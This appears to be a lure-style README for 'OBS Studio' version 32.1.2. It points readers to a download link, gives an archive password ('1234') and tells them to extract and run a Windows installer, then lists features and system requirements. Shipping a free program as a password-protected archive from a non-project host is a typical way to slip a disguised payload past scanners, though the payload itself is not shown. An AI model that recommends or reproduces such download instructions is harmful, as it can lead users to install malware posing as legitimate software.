# obs studio

OBS Studio is free, open-source software for recording, streaming, and compositing video content.

## Installation
### [Download obs studio v32.1.2](https://example.com/obs-studio/releases/latest)
> Archive password: `1234`

- Download and extract the archive and run `OBS-Studio-32.1.2-Windows-x64-Installer.exe`
- Complete the installation

![obs studio](/path/to/pic)

## Features

- Screen capture and recording
- Live streaming to multiple platforms
- Scene switching and composition
- Audio mixing and source control
- Hotkey customization

## System Requirements

| Parameter | Minimum |
|---|---|
| OS | Windows 10, or Windows 11 |
| CPU | Intel i5 2500K, AMD Ryzen 1300X |
| RAM | 4 GB |
| Disk Space | 500 MB |
| Additional | DirectX 10.1 compatible GPU; 64-bit processor and operating system |
